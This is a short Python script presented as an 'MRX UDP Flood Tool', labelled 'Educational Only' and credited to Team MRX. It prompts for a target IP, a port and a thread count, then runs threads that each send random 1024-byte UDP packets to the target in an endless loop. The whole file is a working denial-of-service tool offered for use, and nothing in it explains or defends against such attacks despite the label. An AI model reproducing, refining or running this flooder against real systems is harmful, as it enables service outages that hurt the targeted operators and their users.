# MRX UDP Flood Tool (Educational Only)
# Coded by Team MRX

import socket
import threading
import random
import os

os.system("clear")
print("\033[1;30m")  # رمادي داكن
print("===================================")
print("     MRX UDP FLOOD TOOL (Edu)      ")
print("===================================")
print("\033[0m")

ip = input("Target IP: ")
port = int(input("Target Port: "))
threads = int(input("Number of Threads: "))

def flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    while True:
        try:
            sock.sendto(bytes, (ip, port))
            print(f"\033[1;30m[MRX] Sending packets to {ip}:{port}\033[0m")
        except:
            print(f"\033[1;31m[MRX] Error Sending Packets\033[0m")

# تشغيل الثريدات
for _ in range(threads):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()

input("\n\033[1;30m[MRX] Press Enter to stop...\033[0m")